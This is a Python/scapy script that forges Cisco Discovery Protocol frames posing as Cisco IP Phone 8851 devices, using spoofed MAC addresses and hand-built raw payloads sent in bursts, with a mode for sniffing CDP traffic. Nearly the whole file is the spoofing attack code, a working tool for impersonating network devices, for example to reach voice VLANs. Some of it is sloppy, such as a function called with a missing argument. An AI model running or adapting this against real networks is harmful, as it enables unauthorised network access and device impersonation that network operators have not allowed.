#!/usr/bin/env python
from scapy.all import *
import socket

def switchMacs(): #Od0_ changes
	OUI = "CC:46:D6:" #OUI for cisco devices
	device_id = "CC:CC:CC" #will add in device query
	mac_address = OUI + device_id

	return mac_address

def convert_hex(value):
	if(len(value) < 6):
		return '\\x0' + value[2] + '\\x' + value[3] + value[4]
	else: 
		return '\\x' + value[2] + value[3] + '\\x' + value[4] + value[5]
	
def increment_hex(value):
	test_value = int(value, base=16)
	return hex(test_value - 1)

	
def cdp_spoof(source, offset):
	print source # use 0d42 as offset
	num = 1

	print hex(offset)
	#final_offset = convert_hex(increment_hex(offset))	
	#print str(final_offset)

	test=Dot3(dst='01:00:0c:cc:cc:cc', src=str(source), len=146)/LLC(dsap=0xaa, ssap=0xaa,
	ctrl=3)/SNAP(OUI=0xc, code=0x2000)/Raw(load='\x02\xb4\x0d\x42\x00\x01\x00\x13thisissoldierx!\x00\x02\x00\x11\x00\x00\x00\x01\x01\x01\xcc\x00\x04\xc0\xa8\x01\xae\x00\x03\x00\nPort 1\x00\x04\x00\x08\x00\x00\x04\x90\x00\x05\x00\x1bsip88xx.10-3-1-20.loads\x00\x06\x00\x17Cisco IP Phone 8851\x00\x1c\x00\x07\x00\x02\x00\x00\x19\x00\x0cK\xc6\x00\x00\x00\x00&?\x00\x0b\x00\x05\x01\x00\x10\x00\x06&?')

	test2=Dot3(dst='01:00:0c:cc:cc:cc', src='18:cf:5e:f8:41:0e', len=146)/LLC(dsap=0xaa, ssap=0xaa, ctrl=3)/SNAP(OUI=0xc, code=0x2000)/Raw(load='\x02\xb4\x37\xab\x00\x01\x00\x13SEP38205645AAAA\x00\x02\x00\x11\x00\x00\x00\x01\x01\x01\xcc\x00\x04\xc0\xa8\x01\xae\x00\x03\x00\nPort 2\x00\x04\x00\x08\x00\x00\x04\x90\x00\x05\x00\x1bsip88xx.10-3-1-20.loads\x00\x06\x00\x17Cisco IP Phone 8851\x00\x1c\x00\x07\x00\x02\x00\x00\x19\x00\x0cK\xc6\x00\x00\x00\x00&?\x00\x0b\x00\x05\x01\x00\x10\x00\x06&?')
	
	test3=Dot3(dst='01:00:0c:cc:cc:cc', src='18:cf:5e:f8:41:0e', len=146)/LLC(dsap=0xaa, ssap=0xaa, ctrl=3)/SNAP(OUI=0xc, code=0x2000)/Raw(load='\x02\xb4\x37\xaa\x00\x01\x00\x13SEP38205645AAAA\x00\x02\x00\x11\x00\x00\x00\x01\x01\x01\xcc\x00\x04\xc0\xa8\x01\xae\x00\x03\x00\nPort 3\x00\x04\x00\x08\x00\x00\x04\x90\x00\x05\x00\x1bsip88xx.10-3-1-20.loads\x00\x06\x00\x17Cisco IP Phone 8851\x00\x1c\x00\x07\x00\x02\x00\x00\x19\x00\x0cK\xc6\x00\x00\x00\x00&?\x00\x0b\x00\x05\x01\x00\x10\x00\x06&?')
	
	test4=Dot3(dst='01:00:0c:cc:cc:cc', src='18:cf:5e:f8:41:0e', len=146)/LLC(dsap=0xaa, ssap=0xaa, ctrl=3)/SNAP(OUI=0xc, code=0x2000)/Raw(load='\x02\xb4\x37\xa9\x00\x01\x00\x13SEP38205645AAAA\x00\x02\x00\x11\x00\x00\x00\x01\x01\x01\xcc\x00\x04\xc0\xa8\x01\xae\x00\x03\x00\nPort 4\x00\x04\x00\x08\x00\x00\x04\x90\x00\x05\x00\x1bsip88xx.10-3-1-20.loads\x00\x06\x00\x17Cisco IP Phone 8851\x00\x1c\x00\x07\x00\x02\x00\x00\x19\x00\x0cK\xc6\x00\x00\x00\x00&?\x00\x0b\x00\x05\x01\x00\x10\x00\x06&?')
	
	test5=Dot3(dst='01:00:0c:cc:cc:cc', src='18:cf:5e:f8:41:0e', len=146)/LLC(dsap=0xaa, ssap=0xaa, ctrl=3)/SNAP(OUI=0xc, code=0x2000)/Raw(load='\x02\xb4\x37\xa8\x00\x01\x00\x13SEP38205645AAAA\x00\x02\x00\x11\x00\x00\x00\x01\x01\x01\xcc\x00\x04\xc0\xa8\x01\xae\x00\x03\x00\nPort 5\x00\x04\x00\x08\x00\x00\x04\x90\x00\x05\x00\x1bsip88xx.10-3-1-20.loads\x00\x06\x00\x17Cisco IP Phone 8851\x00\x1c\x00\x07\x00\x02\x00\x00\x19\x00\x0cK\xc6\x00\x00\x00\x00&?\x00\x0b\x00\x05\x01\x00\x10\x00\x06&?')
	
	sendp(test, count=10)
	sendp(test2, count=10)
	sendp(test3, count=10)
	sendp(test4, count=10)
	sendp(test5, count=10)

def packetPortion(packet, start, end):
    i = start
    while packet[0].load[i] != end:
        i+=1;
    return packet[0].load[start:i]
 
def cdp_discover(packet):
    print "--------------------------------------------------"
    print "Host: " + packetPortion(packet, 8, '\x00')
    print "Model: " + packetPortion(packet,89, '\x00')
    print "Protocol: " + packetPortion(packet, 62, '\x00')
    #print "IP: " + socket.inet_ntoa(packetPortion(packet, 36, '\x00'))
    print "MAC: " + packet[0].src
    print "--------------------------------------------------"
 
if __name__ == "__main__":
    if len(sys.argv) == 1:
        print "Usage: ./cdp.py -s [source mac-address] (spoof from source)\n"
        print "Usage: ./cdp.py -c (capture)"
        sys.exit()
 
    if str(sys.argv[1]) == "-t":
	#print increment_hex(sys.argv[2])
	print convert_hex(increment_hex(sys.argv[2]))

    if str(sys.argv[1]) == '-c':
        while 1:
            sniff(filter='ether host 01:00:0c:cc:cc:cc',prn=cdp_discover, count=1)
 
    if str(sys.argv[1]) == '-s':
        if len(sys.argv) < 3:
            cdp_spoof(switchMacs())
        else:
            cdp_spoof(sys.argv[2], int(sys.argv[3], base=16)) #18:cf:5e:f8:41:0e
